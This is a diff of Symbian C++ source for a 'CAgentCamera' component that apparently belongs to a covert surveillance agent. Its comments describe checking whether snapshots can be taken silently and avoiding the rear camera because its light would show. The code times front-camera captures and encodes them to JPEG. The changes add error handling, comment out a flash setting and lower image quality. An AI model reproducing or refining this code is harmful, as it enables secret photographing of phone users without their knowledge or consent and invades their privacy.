@@ -63,7 +63,7 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 	
 	iTimer = CTimeOutTimer::NewL(*this);
 	
-	// we are only interested in front camera
+	// we are only interested in front camera:
 	// unfortunately, we can't set rear camera light off during shooting... so we can't use rear camera
 	iNumCamera = CCamera::CamerasAvailable();  //retrieve the number of available cameras (front and/or rear)
 	if(iNumCamera < 2)
@@ -74,7 +74,12 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 		}
 	iCameraIndex = 1;  //0=rear camera,1=front camera
 	//check if we can silently take snapshots
-	iCamera = CCamera::NewL(*this, iCameraIndex);
+	TRAPD(err,iCamera = CCamera::NewL(*this, iCameraIndex));
+	if(err != KErrNone)  //KErrNoMemory, KErrNotSupported, KErrPermissionDenied
+		{
+		iCameraIndex = -1;
+		return;
+		}
 	iCamera->CameraInfo(iInfo);
 	if(!(iInfo.iOptionsSupported & TCameraInfo::EImageCaptureSupported))
 		{
@@ -89,11 +94,9 @@ void CAgentCamera::ConstructL(const TDesC8& params)
 
 void CAgentCamera::StartAgentCmdL()
 	{
-	// if there's no front camera on device, or if it can't capture images
+	// if there's no front camera on device, or if it can't capture images, or some error condition arised
 	if(iCameraIndex == -1)
 		return;
-	
-	iPerformedStep=0;
 	
 	// set timer
 	TTime time;
@@ -101,6 +104,7 @@ void CAgentCamera::StartAgentCmdL()
 	time += iSecondsInterv;
 	iTimer->RcsAt(time);
 	
+	iPerformedStep=0;
 	//prepare camera if another snapshot is not ongoing
 	if(iEngineState==EEngineNotReady)
 		{
@@ -164,8 +168,8 @@ void CAgentCamera::PowerOnComplete(TInt aError)
 		}
 	else
 		{
-		TRAPD(error,iCamera->PrepareImageCaptureL(iFormat,0)); //here, we simply select largest size (index 0)
-		if(error)
+		TRAPD(err,iCamera->PrepareImageCaptureL(iFormat,0)); //here, we simply select largest size (index 0)
+		if(err)
 			{
 			iCamera->Release();
 			iCamera->PowerOff();
@@ -173,7 +177,7 @@ void CAgentCamera::PowerOnComplete(TInt aError)
 			}
 		else
 			{
-			TRAPD(err,iCamera->SetFlashL(CCamera::EFlashNone));
+			//TRAPD(err,iCamera->SetFlashL(CCamera::EFlashNone));
 			iEngineState = ESnappingPicture;
 			iCamera->CaptureImage(); // calls ImageReady() when complete
 			}
@@ -213,7 +217,6 @@ void CAgentCamera::ImageReady(CFbsBitmap *aBitmap, HBufC8 *aData, TInt aError)
  * Called asynchronously, when a buffer has been filled with the required number of video frames 
  * by CCamera::StartVideoCapture().
  */
-
 void CAgentCamera::FrameBufferReady(MFrameBuffer *aFrameBuffer, TInt aError)
 	{
 	// not implementated; we only take still images.
@@ -246,20 +249,22 @@ HBufC8* CAgentCamera::GetImageBufferL(CFbsBitmap* aBitmap)
 		if (aBitmap == NULL)
 			return HBufC8::NewL(0); 
 
+		// set jpeg properties
 		CFrameImageData* frameImageData = CFrameImageData::NewL();
 		CleanupStack::PushL(frameImageData);
 		TJpegImageData* imageData = new (ELeave) TJpegImageData();
 		imageData->iSampleScheme  = TJpegImageData::EColor444;
-		imageData->iQualityFactor = 100; // = low, set 90 for normal or 100 for high 
+		imageData->iQualityFactor = 75; // 80 low, set 90 for normal or 100 for high 
 		frameImageData->AppendImageData(imageData);
 				
+		// convert to jpeg synchronously
 		HBufC8* imageBuf = NULL;
-		CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
-		CleanupStack::PushL(iencoder);
+		CImageEncoder* encoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
+		CleanupStack::PushL(encoder);
 		TRequestStatus aStatus = KErrNone; 
-		iencoder->Convert( &aStatus, *aBitmap, frameImageData );
+		encoder->Convert( &aStatus, *aBitmap, frameImageData );
 		User::WaitForRequest( aStatus );
-		CleanupStack::PopAndDestroy(iencoder);
+		CleanupStack::PopAndDestroy(encoder);
 				
 		CleanupStack::PopAndDestroy(frameImageData);
 		
